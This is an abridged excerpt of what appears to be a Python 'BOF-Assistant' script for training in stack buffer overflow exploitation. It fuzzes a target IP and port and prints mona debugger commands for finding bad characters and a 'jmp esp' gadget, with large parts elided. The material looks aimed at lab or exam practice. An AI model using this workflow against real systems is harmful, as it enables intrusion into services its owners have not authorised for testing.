...
\____/  \___/\_|          \_| |_/___/___/_|___/\__\__,_|_| |_|\__|
    ...
    input("(Press Enter to Continue)\n")
    print(H_fuzz)
    print("\nNow Let me do some rough fuzzing to check where the stack overflow error occured in the program")
...
def exploit():
    ...
    for i in range(0,4):
        ...
        if i == 2:
            ...
            command = '!mona compare -f C:\\mona\\oscp\\bytearray.bin -a <address>"'
            print(GREEN,command,END)
            pyperclip.copy("!mona compare -f C:\\mona\\oscp\\bytearray.bin -a ")
            print("I have copied the command in your clipboard too!")
            ...
            command = '!mona find -s \'jmp esp\' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\\x00"'
            print(GREEN,command,END)
            pyperclip.copy(command)
            print("I have copied the command in your clipboard too!")
            ...
            # filter out the payload using grep and tr
...
if __name__ == "__main__":
    if len(sys.argv) == 3:
        ...
        print('python3 BOF-Assistant.py <IP> <PORT>')
